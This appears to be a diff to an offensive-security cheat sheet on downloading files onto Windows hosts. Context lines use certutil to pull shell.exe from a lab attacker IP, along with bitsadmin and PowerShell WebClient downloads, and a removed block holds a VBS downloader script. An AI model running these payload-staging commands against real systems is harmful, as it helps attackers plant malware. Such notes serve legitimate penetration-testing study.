@@ -38,10 +38,6 @@ HTTP  Download
 certutil -urlcache -f http://10.10.14.12:8000/shell.exe shell.exe 
 bitsadmin /transfer n http://domain/file c:%homepath%file
 
-VBS
-Set args = Wscript.Arguments Url = "http://domain/file" dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: Set bStrm = createobject("Adodb.Stream") xHttp.Open "GET", Url, False xHttp.Send with bStrm     .type = 1 '     .open     .write xHttp.responseBody     .savetofile " C:%homepath%file", 2 ' end with
-C:>cscript test.vbs
-Check lab guide for script 
 
 Powershell 
 $p = New-Object System.Net.WebClient $p.DownloadFile("http://domain/file" "C:%homepath%file")
